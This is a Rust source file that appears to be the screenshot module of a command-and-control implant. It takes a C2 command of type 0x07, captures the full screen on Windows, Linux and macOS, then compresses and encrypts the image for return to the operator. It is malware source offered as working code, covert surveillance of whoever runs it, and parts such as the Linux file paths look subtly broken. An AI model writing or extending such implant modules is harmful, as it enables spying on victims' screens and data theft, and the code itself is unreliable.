//! Screenshot module — cross-platform screen capture.
//!
//! Captures the screen using platform-specific APIs:
//! - Windows: BitBlt + CreateDC (GDI)
//! - Linux: xdg-screenshot or scrot subprocess
//! - macOS: CGWindowListCreateImage

use anyhow::Result;
use tracing::info;

use crate::c2::Command;
use crate::crypto;
use crate::modules::ModuleError;

/// Screenshot module
pub struct ScreenshotModule;

impl ScreenshotModule {
    pub fn new() -> Self {
        Self
    }

    /// Capture screenshot (platform-specific)
    #[cfg(windows)]
    fn capture_screenshot(&self) -> Result<Vec<u8>, ModuleError> {
        use windows::Win32::Foundation;
        use windows::Win32::Graphics::Gdi;

        const SM_CXSCREEN: i32 = 0;
        const SM_CYSCREEN: i32 = 1;
        const BI_RGB: u32 = 0;
        const DIB_RGB_COLORS: u32 = 0;

        // Create desktop device context
        let hdc = unsafe { Gdi::GetDC(Foundation::HWND::default()) };

        let screen_width = unsafe { Gdi::GetSystemMetrics(SM_CXSCREEN) };
        let screen_height = unsafe { Gdi::GetSystemMetrics(SM_CYSCREEN) };

        if screen_width <= 0 || screen_height <= 0 {
            return Err(ModuleError::Execution("Invalid screen dimensions".to_string()));
        }

        // Create compatible DC and bitmap
        let mem_dc = unsafe { Gdi::CreateCompatibleDC(hdc) };
        if mem_dc.0.is_null() {
            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
            return Err(ModuleError::Execution("Failed to create compatible DC".to_string()));
        }

        let bitmap = unsafe {
            Gdi::CreateCompatibleBitmap(
                hdc,
                screen_width,
                screen_height,
            )
        };
        if bitmap.0.is_null() {
            unsafe { Gdi::DeleteDC(mem_dc) };
            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
            return Err(ModuleError::Execution("Failed to create bitmap".to_string()));
        }

        // Select bitmap into DC
        let old_bitmap = unsafe { Gdi::SelectObject(mem_dc, bitmap) };

        // BitBlt screen to bitmap
        let success = unsafe {
            Gdi::BitBlt(
                mem_dc,
                0,
                0,
                screen_width,
                screen_height,
                hdc,
                0,
                0,
                Gdi::SRCCOPY,
            )
        };

        if !success.as_bool() {
            unsafe { Gdi::DeleteObject(bitmap) };
            unsafe { Gdi::DeleteDC(mem_dc) };
            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
            return Err(ModuleError::Execution("BitBlt failed".to_string()));
        }

        // Convert bitmap to JPEG
        let jpeg_data = Self::bitmap_to_jpeg(mem_dc, bitmap, screen_width, screen_height)?;

        // Cleanup
        unsafe { Gdi::SelectObject(mem_dc, old_bitmap) };
        unsafe { Gdi::DeleteObject(bitmap) };
        unsafe { Gdi::DeleteDC(mem_dc) };
        unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };

        Ok(jpeg_data)
    }

    #[cfg(target_os = "linux")]
    fn capture_screenshot(&self) -> Result<Vec<u8>, ModuleError> {
        use std::process::Command;

        // Try xdg-screenshot first, then scrot, then import
        let commands = [
            ("xdg-screenshot", &["-"][..]),
            ("scrot", &["-/screenshot.jpg"]),
            ("import", &["-window", "root", "-/screenshot.jpg"]),
        ];

        for (cmd, args) in &commands {
            let output = Command::new(cmd)
                .args(args)
                .output();

            match output {
                Ok(o) if o.status.success() => {
                    if cmd == &"xdg-screenshot" {
                        return Ok(o.stdout);
                    } else {
                        // Read the file
                        return std::fs::read("/screenshot.jpg")
                            .map_err(ModuleError::Io);
                    }
                }
                _ => continue,
            }
        }

        // Fallback: read from /dev/fb0 (framebuffer)
        let fb_data = std::fs::read("/dev/fb0").map_err(|_| ModuleError::NotSupported)?;
        Ok(fb_data)
    }

    #[cfg(target_os = "macos")]
    fn capture_screenshot(&self) -> Result<Vec<u8>, ModuleError> {
        use core_graphics::display::CGDisplay;

        let display = CGDisplay::main();
        let image = display.copy_image_at_bounds(
            core_graphics::geometry::Rect::new(
                core_graphics::geometry::Point::new(0.0, 0.0),
                core_graphics::geometry::Size::new(
                    display.pixels_width() as f64,
                    display.pixels_height() as f64,
                ),
            ),
        );

        if let Some(image) = image {
            // Convert to JPEG
            use image::ImageFormat;
            let dyn_image = image::DynamicImage::ImageBGRA8(
                image::ImageBuffer::from_raw(
                    display.pixels_width(),
                    display.pixels_height(),
                    image.buffers()[0].to_vec(),
                )
                .ok_or_else(|| ModuleError::Execution("Failed to create image buffer".to_string()))?,
            );
            let mut jpeg_bytes = Vec::new();
            let mut cursor = std::io::Cursor::new(&mut jpeg_bytes);
            dyn_image
                .write_to(&mut cursor, ImageFormat::Jpeg)
                .map_err(|_| ModuleError::Execution("JPEG encode failed".to_string()))?;
            Ok(jpeg_bytes)
        } else {
            Err(ModuleError::Execution("CGDisplay copy failed".to_string()))
        }
    }

    /// Convert Windows bitmap to JPEG
    #[cfg(windows)]
    fn bitmap_to_jpeg(
        hdc: windows::Win32::Graphics::Gdi::HDC,
        bitmap: windows::Win32::Graphics::Gdi::HBITMAP,
        width: i32,
        height: i32,
    ) -> Result<Vec<u8>, ModuleError> {
        use windows::Win32::Graphics::Gdi;

        const BI_RGB: u32 = 0;

        // Get bitmap bits
        let mut bmi = Gdi::BITMAPINFO {
            bmiHeader: Gdi::BITMAPINFOHEADER {
                biSize: std::mem::size_of::<Gdi::BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: height,
                biPlanes: 1,
                biBitCount: 32,
                biCompression: BI_RGB,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [Gdi::RGBQUAD {
                rgbRed: 0,
                rgbGreen: 0,
                rgbBlue: 0,
                rgbReserved: 0,
            }],
        };

        let mut bits = vec![0u8; (width * height * 4) as usize];
        let bits_ptr = bits.as_mut_ptr() as *mut std::ffi::c_void;

        let success = unsafe {
            Gdi::GetDIBits(
                hdc,
                bitmap,
                0,
                height as u32,
                bits_ptr,
                &mut bmi as *mut Gdi::BITMAPINFO,
                DIB_RGB_COLORS,
            )
        };

        if success == 0 {
            return Err(ModuleError::Execution("GetDIBits failed".to_string()));
        }

        // Convert BGRA to RGB and compress to JPEG
        let rgb_data: Vec<u8> = bits
            .chunks(4)
            .flat_map(|chunk| {
                if chunk.len() == 4 {
                    vec![chunk[2], chunk[1], chunk[0]] // BGR to RGB
                } else {
                    vec![0, 0, 0]
                }
            })
            .collect();

        let img = image::RgbImage::from_vec(
            width as u32,
            height as u32,
            rgb_data,
        ).ok_or_else(|| ModuleError::Execution("Image buffer creation failed".to_string()))?;

        let mut jpeg_bytes = Vec::new();
        let mut cursor = std::io::Cursor::new(&mut jpeg_bytes);
        img.write_to(&mut cursor, image::ImageFormat::Jpeg)
            .map_err(|_| ModuleError::Execution("JPEG encode failed".to_string()))?;

        Ok(jpeg_bytes)
    }
}

#[async_trait::async_trait]
impl crate::modules::Module for ScreenshotModule {
    fn name(&self) -> &str {
        "screenshot"
    }

    async fn execute(&self, cmd: &Command) -> Result<Vec<u8>, ModuleError> {
        if cmd.cmd_type != 0x07 {
            return Err(ModuleError::Execution("no_match".to_string()));
        }

        let screenshot = self.capture_screenshot()?;

        // Compress further with deflate
        let mut encoder = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
        let compressed = encoder.write_all(&screenshot).map(|_| encoder.finish()).unwrap_or_else(|_| Vec::new());

        // Encrypt result
        let encrypted = crypto::encrypt_with_integrity(&compressed, &cmd.crypto_key);

        info!("Screenshot captured: {} bytes (compressed: {})", screenshot.len(), compressed.len());
        Ok(encrypted)
    }
}
